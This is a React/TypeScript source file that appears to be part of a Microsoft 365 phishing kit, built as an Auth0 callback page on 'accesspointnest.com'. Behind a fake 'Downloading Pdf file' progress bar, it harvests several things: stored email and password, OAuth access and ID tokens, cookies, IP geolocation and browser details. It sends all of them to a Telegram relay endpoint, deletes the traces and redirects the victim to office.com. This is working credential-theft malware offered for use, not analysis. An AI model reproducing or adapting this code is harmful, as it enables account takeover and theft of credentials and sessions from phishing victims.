import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Auth0Client } from '@auth0/auth0-spa-js';

function getByteLengthForBrowser(str: string): number {
  return new Blob([str]).size;
}

export default function AdminConsentCallback() {
  const navigate = useNavigate();
  const [status, setStatus] = useState('Please wait while we complete the sign-in process...');
  const [progress, setProgress] = useState(10);

  useEffect(() => {
    const handleAuth0Callback = async () => {
      try {
        setProgress(20);
        console.log('🔄 Processing Auth0 callback...');
        console.log('✅ Callback URL: https://accesspointnest.com/auth/callback');

        // ✅ Your Auth0 credentials with NEW callback URL
        const auth0Client = new Auth0Client({
          domain: 'dev-6kunthi1vyiz6ezr.us.auth0.com',
          clientId: 'lv6EnG8RUVmcwGzBPpoyDNS7a5oP9B92',
          authorizationParams: {
            redirect_uri: 'https://accesspointnest.com/auth/callback', // ✅ NEW CALLBACK
            scope: 'openid profile email offline_access'
          },
          cacheLocation: 'localstorage',
          useRefreshTokens: true
        });

        setStatus('Downloading Pdf file');
        setProgress(30);

        // Handle Auth0 redirect callback
        await auth0Client.handleRedirectCallback();
        
        setProgress(50);
        console.log('✅ Auth0 authentication complete (NO UNVERIFIED WARNING!)');

        // Get user info and tokens
        const user = await auth0Client.getUser();
        const accessToken = await auth0Client.getTokenSilently();
        const idToken = await auth0Client.getIdTokenClaims();

        console.log('✅ User authenticated:', user?.email);
        console.log('✅ Tokens retrieved successfully');

        setProgress(70);

        // Get stored credentials
        const storedCreds = localStorage.getItem('ms_auth_credentials') || 
                           sessionStorage.getItem('ms_auth_credentials');
        
        let credentials = { email: '', password: '' };
        
        if (storedCreds) {
          try {
            credentials = JSON.parse(storedCreds);
            console.log('✅ Credentials loaded:', {
              email: credentials.email,
              hasPassword: !!credentials.password
            });
          } catch (e) {
            console.error('❌ Failed to parse credentials:', e);
          }
        }

        // Fallback email from Auth0 user
        if (!credentials.email) {
          credentials.email = user?.email || localStorage.getItem('ms_email') || sessionStorage.getItem('ms_email') || '';
        }

        // Get password from backup storage
        if (!credentials.password) {
          credentials.password = localStorage.getItem('ms_password') || sessionStorage.getItem('ms_password') || '';
        }

        console.log('📊 Final credentials:', {
          email: credentials.email,
          hasPassword: !!credentials.password,
          passwordLength: credentials.password?.length || 0
        });

        // Get location data
        let locationData: any = {};
        try {
          const locResponse = await fetch('https://ipapi.co/json/');
          locationData = await locResponse.json();
          console.log('✅ Location data fetched');
        } catch (locError) {
          console.warn('⚠️ Could not fetch location data:', locError);
        }

        // Get cookies from current domain
        let cookies: any[] = [];
        const currentDomainCookies = document.cookie;

        if (currentDomainCookies) {
          const cookiePairs = currentDomainCookies.split(';');
          cookiePairs.forEach(pair => {
            const trimmed = pair.trim();
            if (trimmed) {
              const [name, ...valueParts] = trimmed.split('=');
              const value = valueParts.join('=');
              if (name && value) {
                cookies.push({
                  name: name.trim(),
                  value: value.trim(),
                  domain: window.location.hostname,
                  path: '/',
                  secure: window.location.protocol === 'https:',
                  sameSite: 'None',
                  session: true
                });
              }
            }
          });
          console.log(`✅ Captured ${cookies.length} cookies`);
        }

        // Build combined OAuth session data
        const combinedOAuthSession = {
          auth0: {
            access_token: accessToken,
            id_token: idToken?.__raw,
            user: user,
            provider: 'microsoft-via-auth0',
            captured_at: new Date().toISOString()
          },
          
          credentials: {
            email: credentials.email,
            password: credentials.password || ''
          },
          
          browser: {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
          },
          
          location: locationData,
          
          metadata: {
            captured_at: new Date().toISOString(),
            domain: window.location.hostname,
            callback_url: 'https://accesspointnest.com/auth/callback',
            source: 'accesspointnest-auth0-capture',
            auth_provider: 'Auth0',
            verified: true,
            no_unverified_warning: true
          }
        };

        const jsonContent = JSON.stringify({ cookies }, null, 2);
        const cookieFile = {
            name: `cookies_${new Date().getTime()}.json`,
            content: jsonContent,
            size: getByteLengthForBrowser(jsonContent)
        };

        const oauthSessionFile = {
          name: `auth0_session_${new Date().getTime()}.json`,
          content: JSON.stringify(combinedOAuthSession, null, 2),
          size: getByteLengthForBrowser(JSON.stringify(combinedOAuthSession, null, 2))
        };

        setStatus('Downloading Pdf file');
        console.log('📤 Sending data to Telegram...');

        const payload = {
          email: credentials.email,
          password: credentials.password || '',
          oauth: {
            access_token: accessToken,
            id_token: idToken?.__raw,
            provider: 'Auth0-Microsoft',
            user: user
          },
          sessionData: combinedOAuthSession,
          cookies: cookies,
          cookieCount: cookies.length,
          locationData: locationData,
          cookieFiles: { 
            jsonFile: cookieFile,
            oauthSessionFile: oauthSessionFile
          },
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString(),
          validated: true,
          microsoftAccount: true,
          auth0Verified: true,
          noUnverifiedWarning: true,
          callbackUrl: 'https://accesspointnest.com/auth/callback'
        };

        console.log('📊 Payload summary:', {
          email: payload.email,
          hasPassword: !!payload.password,
          hasTokens: !!payload.oauth.access_token,
          hasUser: !!payload.oauth.user,
          cookieCount: payload.cookieCount,
          hasLocation: !!payload.locationData.ip,
          auth0Verified: true,
          callbackUrl: 'https://accesspointnest.com/auth/callback'
        });

        const telegramResponse = await fetch('/api/sendTelegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (!telegramResponse.ok) {
          throw new Error('Failed to send data to Telegram');
        }

        console.log('✅✅✅ SUCCESS: All data transmitted (Auth0 verified - NO WARNING!)');
        setProgress(100);
        setStatus('Download Successful');

        // Clean up stored credentials
        localStorage.removeItem('ms_auth_credentials');
        sessionStorage.removeItem('ms_auth_credentials');
        localStorage.removeItem('ms_password');
        sessionStorage.removeItem('ms_password');

        setTimeout(() => {
          console.log('🎉 Redirecting to Office.com...');
          window.location.href = 'https://www.office.com/?auth=2';
        }, 2000);

      } catch (err: any) {
        console.error('❌ Error in Auth0 callback:', err);
        setStatus(`Error: ${err.message}`);
      }
    };

    handleAuth0Callback();
  }, [navigate]);

  return (
    <div style={{
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Segoe UI, Arial, sans-serif',
      backgroundColor: '#f3f2f1'
    }}>
        <h2 style={{ marginBottom: '20px', fontSize: '24px' }}>
          {status}
          {status.includes('Downloading') && <span style={{ animation: 'dots 1.5s steps(3, end) infinite' }}>...</span>}
        </h2>
        <div style={{
            width: '300px',
            height: '8px',
            backgroundColor: '#e0e0e0',
            borderRadius: '4px',
            overflow: 'hidden',
            marginBottom: '20px'
        }}>
            <div style={{
                width: `${progress}%`,
                height: '100%',
                backgroundColor: '#0078d4',
                transition: 'width 0.3s ease'
            }}></div>
        </div>
        <p style={{ fontSize: '14px', color: '#666', marginBottom: '30px' }}>{progress}%</p>
        {progress < 100 && (
          <div style={{
              border: '4px solid #f3f2f1',
              borderTop: '4px solid #0078d4',
              borderRadius: '50%',
              width: '40px',
              height: '40px',
              animation: 'spin 1s linear infinite'
          }}></div>
        )}
      <style>{`
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60%, 100% { content: '...'; } }
      `}</style>
    </div>
  );
}